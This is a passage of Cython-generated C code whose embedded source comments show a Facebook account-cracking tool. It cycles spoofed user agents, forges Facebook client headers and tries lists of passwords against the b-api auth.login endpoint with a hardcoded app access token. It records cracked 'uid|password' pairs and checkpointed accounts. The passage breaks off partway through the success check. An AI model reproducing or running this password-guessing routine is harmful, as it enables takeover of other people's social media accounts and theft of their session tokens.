  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 575, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":587
 * 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 * 		])
 * 		sys.stdout.write(             # <<<<<<<<<<<<<<
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":588
 * 		])
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))             # <<<<<<<<<<<<<<
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 */
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_5 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyTuple_New(4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_2 = 0;
  __pyx_t_4 = 0;
  __pyx_t_6 = 0;
  __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_ok_s_cp_s, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 588, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 587, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":589
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()             # <<<<<<<<<<<<<<
 * 		for pw in pwx:
 * 			pw = pw.lower()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 589, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 589, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 589, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 589, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":590
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 */
  if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
    __pyx_t_1 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_1); __pyx_t_5 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 590, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 590, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 590, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 590, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 590, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 590, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 590, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":591
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 * 			pw = pw.lower()             # <<<<<<<<<<<<<<
 * 			ses = requests.Session()
 * 			headers = {
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 591, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 591, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":592
 * 		for pw in pwx:
 * 			pw = pw.lower()
 * 			ses = requests.Session()             # <<<<<<<<<<<<<<
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 592, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_Session); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 592, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 592, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":594
 * 			ses = requests.Session()
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),             # <<<<<<<<<<<<<<
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),
 */
    __pyx_t_3 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_bandwidth, __pyx_t_7) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "libme.pyx":595
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-connection-quality": "EXCELLENT",
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_random); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 595, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_randint); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 595, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 595, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 595, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_sim_hni, __pyx_t_8) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":596
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 * 				"x-fb-connection-quality": "EXCELLENT",
 * 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 */
    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 596, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 596, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 596, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 596, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_net_hni, __pyx_t_7) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_quality, __pyx_n_s_EXCELLENT) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_type, __pyx_kp_s_cell_CTRadioAccessTechnologyHSDP) < 0) __PYX_ERR(0, 594, __pyx_L1_error)

    /* "libme.pyx":599
 * 				"x-fb-connection-quality": "EXCELLENT",
 * 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 * 				"user-agent": ua,             # <<<<<<<<<<<<<<
 * 				"content-type": "application/x-www-form-urlencoded",
 * 				"x-fb-http-engine": "Liger"
 */
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_http_engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 594, __pyx_L1_error)
    __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_3));
    __pyx_t_3 = 0;

    /* "libme.pyx":603
 * 				"x-fb-http-engine": "Liger"
 * 			}
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)             # <<<<<<<<<<<<<<
 * 			if "session_key" in response.text and "EAAA" in response.text:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_uid); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = PyNumber_Add(__pyx_kp_s_https_b_api_facebook_com_method, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = PyNumber_Add(__pyx_t_8, __pyx_kp_s_password); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_pw); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_6 = PyNumber_Add(__pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = PyNumber_Add(__pyx_t_6, __pyx_kp_s_credentials_type_device_based_l); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_8);
    PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_8);
    __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 603, __pyx_L1_error)
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_6, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 603, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_7);
    __pyx_t_7 = 0;

    /* "libme.pyx":604
 * 			}
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
 * 			if "session_key" in response.text and "EAAA" in response.text:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 604, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 604, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_12 = (__pyx_t_11 != 0);
    if (__pyx_t_12) {
    } else {
      __pyx_t_10 = __pyx_t_12;
      goto __pyx_L6_bool_binop_done;
    }
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 604, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_EAAA, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 604, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_11 = (__pyx_t_12 != 0);
    __pyx_t_10 = __pyx_t_11;
    __pyx_L6_bool_binop_done:;
    if (__pyx_t_10) {

      /* "libme.pyx":605
